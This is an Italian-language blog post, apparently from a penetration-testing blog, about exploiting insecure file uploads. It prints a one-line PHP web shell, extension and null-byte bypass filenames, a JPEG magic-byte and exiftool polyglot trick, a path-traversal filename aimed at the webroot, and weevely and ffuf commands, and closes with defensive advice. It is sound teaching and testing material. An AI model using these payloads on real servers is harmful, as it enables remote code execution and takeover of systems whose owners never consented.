---
layout: post
title: "Web Shell e Upload Bypass: sfruttare vulnerabilità nei file upload"
date: 2026-06-02
cat: red
tags: [web shell, file upload, bypass, PHP, pentest, OWASP]
excerpt: "Le vulnerabilità di file upload sono tra le più critiche del web: permettono di caricare codice eseguibile sul server. Come funzionano, come si sfruttano e come si difendono."
---

Un file upload mal gestito è una delle vulnerabilità più pericolose che un pentester possa trovare. Se il server accetta ed esegue file caricati dall'utente, l'attaccante può ottenere **Remote Code Execution** direttamente.

## Cos'è una web shell

Una web shell è un file (solitamente PHP, JSP, ASP) caricato sul server che permette di eseguire comandi arbitrari tramite richieste HTTP. La versione più semplice:

```php
<?php system($_GET['cmd']); ?>
```

Salvato come `shell.php` e caricato su un server PHP vulnerabile, permette di eseguire comandi così:
```
http://target.com/uploads/shell.php?cmd=id
```

## Tecniche di bypass dei filtri

I server tentano di filtrare i file pericolosi. Ecco come si bypassano.

### Bypass dell'estensione

```
shell.php      → bloccato
shell.php5     → eseguito da PHP su configurazioni vecchie
shell.phtml    → eseguito
shell.pHp      → case-insensitive bypass
shell.php.jpg  → se il server tronca l'estensione
shell.php%00.jpg  → null byte injection (PHP < 5.3.4)
```

### Bypass del Content-Type

Il server controlla solo il `Content-Type` header, non il contenuto reale:

```
# Richiesta normale intercettata in Burp Suite:
Content-Type: image/jpeg

# File caricato: codice PHP con header JPEG
ÿØÿà <?php system($_GET['cmd']); ?>
```

Aggiungendo i magic bytes di un JPEG all'inizio del file PHP, si supera il controllo del tipo MIME.

### MIME sniffing e polyglot

Un **polyglot file** è valido sia come immagine che come script. Tool come `exiftool` permettono di iniettare PHP nel campo Comment di un'immagine JPEG reale:

```bash
exiftool -Comment='<?php system($_GET["cmd"]); ?>' legit.jpg -o shell.jpg
```

Se il server salva il file e PHP è configurato per eseguire `.jpg`, il codice viene eseguito.

### Directory traversal nell'upload

Se il filename non è sanificato:
```
filename="../../../var/www/html/shell.php"
```

Il file viene salvato nella webroot invece della cartella upload.

## Strumenti pratici

```bash
# weevely — web shell con canale cifrato
weevely generate password123 shell.php
weevely http://target.com/uploads/shell.php password123

# ffuf per trovare la cartella upload dopo aver caricato
ffuf -w common.txt -u http://target.com/FUZZ/shell.php
```

## Difesa

- **Whitelist** delle estensioni, non blacklist
- Salva i file fuori dalla webroot
- Rinomina i file con UUID casuale
- Disabilita l'esecuzione di script nelle cartelle upload
- Usa un file storage separato (S3, CDN) invece del filesystem del server
- Valida il contenuto del file, non solo l'estensione o il MIME type
